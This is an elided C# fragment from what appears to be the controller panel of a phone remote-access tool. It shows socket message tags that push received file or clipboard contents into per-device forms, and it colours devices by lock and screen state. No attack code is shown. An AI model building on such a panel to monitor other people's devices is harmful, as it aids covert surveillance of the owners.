    ...
    */
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
                ...
                switch (tag.Split('|')[0])
                {
                    case "<CONTENT>":
                        ...
                        Invoke((MethodInvoker)delegate
                        {
                            ...
                            edt.richTextBox1.Text = Encoding.UTF8.GetString(dataBuff).Replace("[NEW_LINE]", Environment.NewLine);
                    ...
                    case "<PANOGELDI>":
                        try
                        {
                            if (FindTelephonFormById(soket2.Handle.ToString()) != null)
                            {
                                ...
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = "null";
                                }
                            }
                        }
                        catch (Exception) { }
        ...
        private void skypeStatus(DataGridViewCell cel, string status)
        {
            ...
            switch (status)
            {
                case "LOCKED&SCREEN OFF&":
                    clr = Color.FromArgb(255, 36, 0); // Red
                    break;
        ...
        {           
            ...
            row.Cells["Column4"].Value = "   " + c.getName() + "       " + c.getCode();
